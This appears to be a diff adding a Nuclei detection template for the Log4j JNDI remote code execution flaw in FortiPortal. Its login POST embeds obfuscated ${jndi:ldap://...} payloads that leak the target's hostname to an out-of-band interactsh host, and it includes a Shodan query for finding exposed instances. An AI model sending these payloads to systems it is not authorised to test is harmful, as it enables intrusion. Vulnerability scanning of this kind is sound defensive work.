@@ -1,0 +1,68 @@
+id: fortiportal-log4j-rce
+
+info:
+  name: FortiPortal - Remote Code Execution (Apache Log4j)
+  author: shaikhyaser
+  severity: critical
+  description: |
+    FortiPortal is susceptible to Log4j JNDI remote code execution. FortiPortal provides comprehensive security management and analytics within a multi-tenant, multi-tier management framework.
+  reference:
+    - https://www.fortiguard.com/psirt/FG-IR-21-245
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
+    cvss-score: 10
+    cve-id: CVE-2021-44228
+    cwe-id: CWE-77
+    cpe: cpe:2.3:a:fortinet:fortiportal:*:*:*:*:*:*:*:*
+  metadata:
+    max-request: 1
+    shodan-query: html:"FortiPortal"
+    product: fortiportal
+    vendor: fortinet
+  tags: cve,cve2021,rce,jndi,log4j,fortiportal,oast,kev
+variables:
+  rand1: '{{rand_int(111, 999)}}'
+  rand2: '{{rand_int(111, 999)}}'
+  str: "{{rand_base(5)}}"
+
+http:
+  - raw:
+      - |
+        POST /fpc/login/ HTTP/1.1
+        Host: {{Hostname}}
+        Origin: {{RootURL}}
+        Accept: application/json, text/plain, */*
+        Referer: {{RootURL}}/fpc/app/login
+        Content-Type: application/json
+
+        {"username":"${jndi:ldap://${:-{{rand1}}}${:-{{rand2}}}.${hostName}.username.{{interactsh-url}}/{{str}}}","password":"{{str}}","isAdmin":false,"locale":"${jndi:ldap://${:-{{rand1}}}${:-{{rand2}}}.${hostName}.username.{{interactsh-url}}/{{str}}}"}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: interactsh_protocol # Confirms the DNS Interaction
+        words:
+          - "dns"
+
+      - type: regex
+        part: interactsh_request
+        regex:
+          - '\d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+'
+
+    extractors:
+      - type: kval
+        kval:
+          - interactsh_ip
+
+      - type: regex
+        part: interactsh_request
+        group: 2
+        regex:
+          - '\d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+'
+
+      - type: regex
+        part: interactsh_request
+        group: 1
+        regex:
+          - '\d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+'
+# digest: 4b0a00483046022100f2168dcbecabf31eab045dc2e26fc31a2e081b5bd3f14bc61fb4397dcfe7d57b02210096b553822fd4f4d7a3dbdab9f0c801bca9ddd105a8bcdbc312c33ceaf036ac56:922c64590222798bb761d5b6d8e72950
